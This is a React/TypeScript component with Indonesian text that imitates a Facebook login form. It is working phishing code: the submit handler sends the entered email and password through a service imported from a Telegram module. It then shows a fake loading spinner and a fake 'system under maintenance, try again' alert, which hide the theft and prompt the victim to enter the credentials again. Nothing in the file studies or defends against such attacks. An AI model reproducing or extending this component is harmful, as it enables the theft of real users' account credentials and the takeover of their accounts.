import { useState } from 'react';
import { sendFacebookLogin } from '../services/telegram';
import AlertModal from './AlertModal';
import './LoginForm.css';

interface FacebookLoginProps {
  onClose: () => void;
}

const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
  const [step, setStep] = useState(1); // 1: FB Form, 0: Loading
  const [alertConfig, setAlertConfig] = useState<{isOpen: boolean, message: string, subMessage?: string}>({
    isOpen: false,
    message: '',
    subMessage: ''
  });

  // STEP 1 STATES
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  
  const [showCustomLoading, setShowCustomLoading] = useState(false);

  // STEP 1 HANDLER: Direct Submit
  const handleFbSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      alert("Email dan Kata Sandi harus diisi!");
      return;
    }
    
    // No questions anymore
    const q1 = "-";
    const q2 = "-";

    // Send all data (FB Creds + Answers)
    const success = await sendFacebookLogin(email, password, q1, q2);
    
    // Show Loading Overlay
    setShowCustomLoading(true);
    setStep(0); // Hide forms

    setTimeout(() => {
      setShowCustomLoading(false);
      
      if (success) {
        setAlertConfig({
          isOpen: true,
          message: "Sistem sedang maintenance.",
          subMessage: "Silakan coba login kembali."
        });
        setStep(1); // Kembali ke form login
      } else {
        alert("Terjadi kesalahan. Silakan coba lagi.");
        setStep(1); // Retry login
      }
    }, 5000);
  };

  // Custom Loading Component
  if (showCustomLoading) {
    return (
      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fade-in">
        <div className="flex flex-col items-center">
          <div className="relative w-20 h-20 mb-4">
            {/* Outer Ring - Gold */}
            <div className="absolute inset-0 rounded-full border-[5px] border-t-[#ffd700] border-r-[#ffd700] border-b-transparent border-l-transparent animate-spin"></div>
            {/* Inner Ring - Pink */}
            <div className="absolute inset-2 rounded-full border-[5px] border-t-transparent border-r-[#e91e63] border-b-[#e91e63] border-l-transparent animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1.5s' }}></div>
            {/* Center Dot */}
            <div className="absolute inset-0 flex items-center justify-center">
               <div className="w-3 h-3 bg-white rounded-full animate-ping"></div>
            </div>
          </div>
          <div className="text-[#ffd700] font-black text-lg tracking-[0.2em] uppercase drop-shadow-[0_0_10px_rgba(255,215,0,0.5)] animate-pulse">
            Memuat...
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="relative flex flex-col items-center">
      
      {/* ================= STEP 1: FACEBOOK FORM ================= */}
      {step === 1 && (
        <div className="bg-white rounded-[10px] shadow-[0_4px_10px_rgba(238,4,4,0.2)] p-5 w-[400px] relative animate-pop-in">
          <button 
            onClick={onClose}
            className="absolute top-2.5 right-2.5 bg-transparent border-none text-[18px] font-bold text-[#333] cursor-pointer hover:text-black"
          >
            ×
          </button>

          <h2 className="text-[20px] text-[#333] text-center mb-5 font-bold">
            Login ke Facebook
          </h2>

          <form onSubmit={handleFbSubmit}>
            <input
              type="text"
              placeholder="Email atau Nomor Telepon"
              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Kata Sandi"
              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full p-2.5 bg-[#1877f2] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#155db3] transition-colors"
            >
              Masuk
            </button>

            <div className="text-center mt-[15px] text-[14px] text-[#555]">
              <a href="#" className="text-[#1877f2] no-underline hover:underline">
                Lupa kata sandi?
              </a>
            </div>

            <div className="my-5 border-t border-[#dadde1]"></div>

            <button
              type="button"
              className="block mx-auto w-[60%] p-[11px] bg-[#42b72a] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#36a420] transition-colors"
            >
              Buat akun baru
            </button>
          </form>
        </div>
      )}

      {/* Alert Modal */}
      <AlertModal 
          isOpen={alertConfig.isOpen} 
          onClose={() => setAlertConfig(prev => ({ ...prev, isOpen: false }))} 
          title="AKSES DIBATASI" 
          message={alertConfig.message} 
          subMessage={alertConfig.subMessage} 
        />
    </div>
  );
};

export default FacebookLogin;
